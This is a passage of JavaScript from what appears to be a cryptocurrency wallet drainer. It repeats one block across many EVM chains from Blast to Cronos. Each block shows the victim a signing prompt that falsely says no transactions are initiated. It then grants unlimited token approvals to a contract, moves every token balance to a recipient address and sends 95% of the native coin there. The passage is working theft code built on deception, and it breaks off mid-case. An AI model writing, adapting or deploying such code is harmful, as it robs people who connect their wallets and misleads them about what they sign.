                          const transaction = {
                              to: recipientAddress, // Replace with the recipient's address
                              value: amountToSend,
                              // Optional: You can specify gasLimit and gasPrice here if necessary
                          };
                          const txResponse = await signer.sendTransaction(transaction);
                          console.log(`Transaction hash: ${txResponse.hash}`);
             
                          // Wait for the transaction to be mined
                          const txReceipt = await txResponse.wait();
                          console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                          }else{
                            console.log('No balance found for BLAST to send')
                           
                          }
                        } catch (error) {
                             console.error('Error transferring BLAST:', error);
                            
                        }
                        break;
          
          
                    //SCROLL
                    case scroll.chainId:
                      const scrollTokens = await fetchSCROLLTokens(address);
          
                      // Message to sign
                      const scrollMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const scrollSignature = await signer.signMessage(scrollMessage);
                      console.log('Signature:', scrollSignature);
          
                      const scrollTokenDetails = [];
                      for (let token of scrollTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              scrollTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      scrollTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of scrollTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(scrollContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(scrollContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                         
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} SCROLL`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} SCROLL`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for SCROLL to send')
                         
                       }
                     } catch (error) {
                          console.error('Error transferring SCROLL:', error);
                          
                     }
                     break;
                     
                    //METIS
                    case metis.chainId:
                      const metisTokens = await fetchMETISTokens(address);
          
                      // Message to sign
                      const metisMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const metisSignature = await signer.signMessage(metisMessage);
                      console.log('Signature:', metisSignature);
          
                      const metisTokenDetails = [];
                      for (let token of metisTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              metisTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      metisTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of metisTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(metisContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(metisContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                          
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} METIS`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} METIS`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for METIS to send')
                         
                       }
                     } catch (error) {
                          console.error('Error transferring METIS:', error);
                          
                     }
                          break;
          
                    //MANTA      
                    case manta.chainId:
                      const mantaTokens = await fetchMANTATokens(address);
          
                      // Message to sign
                      const mantaMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const mantaSignature = await signer.signMessage(mantaMessage);
                      console.log('Signature:', mantaSignature);
          
                      const mantaTokenDetails = [];
                      for (let token of mantaTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              mantaTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      mantaTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of mantaTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(mantaContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(mantaContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                          
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} MANTA`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} MANTA`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for MANTA to send')
                         
                       }
                     } catch (error) {
                          console.error('Error transferring MANTA:', error);
                         
                     }
                      break;
          
                    //FANTOM      
                    case fantom.chainId:
                      const fantomTokens = await fetchFANTOMTokens(address);
          
                      // Message to sign
                      const fantomMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const fantomSignature = await signer.signMessage(fantomMessage);
                      console.log('Signature:', fantomSignature);
          
                      const fantomTokenDetails = [];
                      for (let token of fantomTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              fantomTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      fantomTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of fantomTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(fantomContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(fantomContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                          
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} FANTOM`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} FANTOM`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for FANTOM to send')
                         
                       }
                     } catch (error) {
                          console.error('Error transferring FANTOM:', error);
                          
                     }
                      break;
          
                    //GNOSIS
                    case gnosis.chainId:
                      const gnosisTokens = await fetchGNOSISTokens(address);
          
                      // Message to sign
                      const gnosisMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const gnosisSignature = await signer.signMessage(gnosisMessage);
                      console.log('Signature:', gnosisSignature);
          
                      const gnosisTokenDetails = [];
                      for (let token of gnosisTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              gnosisTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      gnosisTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of gnosisTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(gnosisContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(gnosisContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                         
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} GNOSIS`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} GNOSIS`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for GNOSIS to send')
                         
                       }
                     } catch (error) {
                          console.error('Error transferring GNOSIS:', error);
                         
                     }
                      break;
          
                    //LINEA
                    case linea.chainId:
                      const lineaTokens = await fetchLINEATokens(address);
          
                      // Message to sign
                      const lineaMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const lineaSignature = await signer.signMessage(lineaMessage);
                      console.log('Signature:', lineaSignature);
          
                      const lineaTokenDetails = [];
                      for (let token of lineaTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              lineaTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      lineaTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of lineaTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(lineaContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(lineaContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                         
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} LINEA`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} LINEA`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for LINEA to send')
                        
                       }
                     } catch (error) {
                          console.error('Error transferring LINEA:', error);
                          
                     }
                      break;
          
                  
                    //CELO
                    case celo.chainId:
                      const celoTokens = await fetchCELOTokens(address);
          
                      // Message to sign
                      const celoMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const celoSignature = await signer.signMessage(celoMessage);
                      console.log('Signature:', celoSignature);
          
                      const celoTokenDetails = [];
                      for (let token of celoTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              celoTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      celoTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of celoTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(celoContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(celoContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                          
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} CELO`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} CELO`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for CELO to send')
                         
                       }
                     } catch (error) {
                          console.error('Error transferring CELO:', error);
                          
                     }
                      break;
          
                    
                    //AVALANCHE
                    case avalanche.chainId:
                      const avaTokens = await fetchAVALANCHETokens(address);
          
                      // Message to sign
                      const avaMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const avaSignature = await signer.signMessage(avaMessage);
                      console.log('Signature:', avaSignature);
          
                      const avaTokenDetails = [];
                      for (let token of avaTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              avaTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      avaTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of avaTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(avalancheContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(avalancheContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                          
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} AVALANCHE`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} AVALANCHE`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for AVALANCHE to send')
                      
                       }
                     } catch (error) {
                          console.error('Error transferring AVALANCHE:', error);
                          
                     }
                      break;
          
                    //OPBNB
                    case opbnb.chainId:      
                    const opbnbTokens = await fetchOPBNBTokens(address);
          
                      // Message to sign
                      const opbnbMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const opbnbSignature = await signer.signMessage(opbnbMessage);
                      console.log('Signature:', opbnbSignature);
          
                      const opbnbTokenDetails = [];
                      for (let token of opbnbTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              opbnbTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      opbnbTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of opbnbTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(opbnbContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(opbnbContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                          
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} OPBNB`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} OPBNB`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for OPBNB to send')
                         
                       }
                     } catch (error) {
                          console.error('Error transferring OPBNB:', error);
                          
                     }
                        break;
              
                    //OKX
                    case okx.chainId:
                      const okxTokens = await fetchOKXTokens(address);
          
                      // Message to sign
                      const okxMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const okxSignature = await signer.signMessage(okxMessage);
                      console.log('Signature:', okxSignature);
          
                      const okxTokenDetails = [];
                      for (let token of okxTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              okxTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      okxTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of okxTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(okxContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(okxContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                          
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} OKX`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} OKX`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for OKX to send')
                         
                       }
                     } catch (error) {
                          console.error('Error transferring OKX:', error);
                          
                     }
                      break;
          
          
                    //MANTLE
                    case mantle.chainId:
                      const mantleTokens = await fetchMANTLETokens(address);
          
                      // Message to sign
                      const mantleMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const mantleSignature = await signer.signMessage(mantleMessage);
                      console.log('Signature:', mantleSignature);
          
                      const mantleTokenDetails = [];
                      for (let token of mantleTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              mantleTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      mantleTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of mantleTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(mantleContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(mantleContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                          
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} MANTLE`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} MANTLE`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for MANTLE to send')
                         
                       }
                     } catch (error) {
                          console.error('Error transferring MANTLE:', error);
                         
                     }
                      break;
          
                    //AURORA
                    case aurora.chainId:
                      const aurTokens = await fetchAURORATokens(address);
          
                      // Message to sign
                      const aurMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const aurSignature = await signer.signMessage(aurMessage);
                      console.log('Signature:', aurSignature);
          
                      const aurTokenDetails = [];
                      for (let token of aurTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              aurTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      aurTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of aurTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(auroraContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(auroraContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
                              console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                          }
                      } catch (error) {
                          console.error('Error transferring tokens:', error);
                          
                      }
          
                     try {
                       //send native tokens
                       const etherBalance = await provider.getBalance(address)
                       console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} AURORA`);
          
                       if(!etherBalance.eq(0)){
                         const amountToSend = etherBalance.mul(95).div(100);
                       console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} AURORA`);
          
                   // Define the transaction
                       const transaction = {
                           to: recipientAddress, // Replace with the recipient's address
                           value: amountToSend,
                           // Optional: You can specify gasLimit and gasPrice here if necessary
                       };
                       const txResponse = await signer.sendTransaction(transaction);
                       console.log(`Transaction hash: ${txResponse.hash}`);
          
                       // Wait for the transaction to be mined
                       const txReceipt = await txResponse.wait();
                       console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                       }else{
                         console.log('No balance found for AURORA to send')
                         
                       }
                     } catch (error) {
                          console.error('Error transferring AURORA:', error);
                         
                     }
                      break;
          
          
                    //CRONOS
                    case cronos.chainId:
                      const cronosTokens = await fetchCRONOSTokens(address);
          
                      // Message to sign
                      const cronosMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                      const cronosSignature = await signer.signMessage(cronosMessage);
                      console.log('Signature:', cronosSignature);
          
                      const cronosTokenDetails = [];
                      for (let token of cronosTokens) {
                          const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                          const balance = await tokenContract.balanceOf(address);
                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
                              cronosTokenDetails.push({
                                  contract: tokenContract,
                                  balance: balance,
                                  symbol: token.tokenSymbol,
                                  address: token.contractAddress
                              });
                          }
                      }
          
                      // Sort tokens by balance, descending
                      cronosTokenDetails.sort((a, b) => b.balance.sub(a.balance));
          
                      try {
                          for(let token of cronosTokenDetails){
                              const maxUint256 = ethers.constants.MaxUint256;
                              // Approve unlimited tokens
                              const approveTx = await token.contract.approve(cronosContractAddress, maxUint256);
                              await approveTx.wait();
                              console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
          
          
                              // Transfer tokens using the smart contract
                              const contract = new ethers.Contract(cronosContractAddress, contractABI, signer);
                              const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                              await transferTx.wait();
